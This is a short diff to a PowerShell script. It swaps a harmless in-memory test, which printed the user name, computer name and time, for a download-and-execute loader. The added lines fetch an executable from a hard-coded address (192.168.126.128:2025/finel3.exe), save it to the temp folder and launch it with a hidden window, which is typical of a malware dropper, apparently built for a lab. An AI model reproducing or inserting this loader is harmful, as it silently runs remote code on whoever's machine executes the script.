@@ -1,7 +1,9 @@
-# Simple in-memory test script
-Write-Host "[+] In-memory PowerShell script executed successfully!" -ForegroundColor Green
-Write-Host "    Current User: $env:USERNAME"
-Write-Host "    Computer: $env:COMPUTERNAME"
-Write-Host "    Time: $(Get-Date)"
-Start-Sleep -Seconds 2
-[Environment]::Exit(0)
+# Define URL and destination
+$url = "http://192.168.126.128:2025/finel3.exe"
+$destination = Join-Path $env:TEMP "final3.exe"
+
+# Download file
+Invoke-WebRequest -Uri $url -OutFile $destination
+
+# Execute the downloaded file
+Start-Process -WindowStyle Hidden -FilePath $destination -Wait
